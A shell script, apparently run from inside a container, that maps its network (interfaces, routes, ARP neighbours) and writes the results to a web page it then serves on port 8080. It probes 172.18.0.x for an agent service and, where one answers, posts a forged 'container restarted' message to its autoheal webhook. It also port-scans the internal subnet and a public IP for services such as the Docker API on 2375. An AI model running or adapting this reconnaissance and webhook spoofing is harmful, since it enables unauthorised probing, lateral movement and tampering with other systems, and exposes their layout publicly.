#!/bin/sh
echo "=== v9: ipvlan L3 + IPAM overlap agent subnet ===" > /app/index.html
echo "Time: $(date -u +%Y-%m-%dT%H:%M:%SZ)" >> /app/index.html
echo "" >> /app/index.html

echo "=== INTERFACES ===" >> /app/index.html
ip -4 addr show >> /app/index.html 2>&1
echo "" >> /app/index.html

echo "=== ROUTES ===" >> /app/index.html
ip route show >> /app/index.html 2>&1
echo "" >> /app/index.html

echo "=== AGENT HUNT: 172.18.0.x:8000 ===" >> /app/index.html
for i in 1 2 3 4 5 6 7 8 9 10; do
  RESULT=$(curl -s -m 2 -o /dev/null -w "%{http_code}" "http://172.18.0.$i:8000/health" 2>/dev/null)
  if [ "$RESULT" != "000" ]; then
    echo "*** AGENT at 172.18.0.$i:8000 → HTTP $RESULT ***" >> /app/index.html
    curl -sv -m 3 "http://172.18.0.$i:8000/health" >> /app/index.html 2>&1
    echo "" >> /app/index.html
    curl -sv -m 3 -X POST "http://172.18.0.$i:8000/webhooks/autoheal" \
      -H "Content-Type: application/json" \
      -d '{"content":"Container ipvlan-compose-proof_00000000-0000-0000-0000-000000000000 (unhealthy) restarted"}' >> /app/index.html 2>&1
    echo "" >> /app/index.html
  else
    echo "172.18.0.$i:8000 → no response" >> /app/index.html
  fi
done
echo "" >> /app/index.html

echo "=== NC PORT SCAN 172.18.0.x ===" >> /app/index.html
for i in 1 2 3 4 5 6 7 8 9 10; do
  for port in 22 80 443 2375 5672 8000 8080 9100 9200 15672; do
    nc -z -w1 172.18.0.$i $port 2>/dev/null && echo "172.18.0.$i:$port OPEN" >> /app/index.html
  done
done
echo "" >> /app/index.html

echo "=== HOST PORTS (45.89.190.124) ===" >> /app/index.html
for port in 22 80 443 2375 5672 8000 8080 9100 9200; do
  nc -z -w1 45.89.190.124 $port 2>/dev/null && echo "45.89.190.124:$port OPEN" >> /app/index.html
done
echo "" >> /app/index.html

echo "=== ARP + NEIGHBORS ===" >> /app/index.html
ip neigh show >> /app/index.html 2>&1
echo "" >> /app/index.html

echo "=== done $(date -u +%Y-%m-%dT%H:%M:%SZ) ===" >> /app/index.html
cd /app && python3 -m http.server 8080
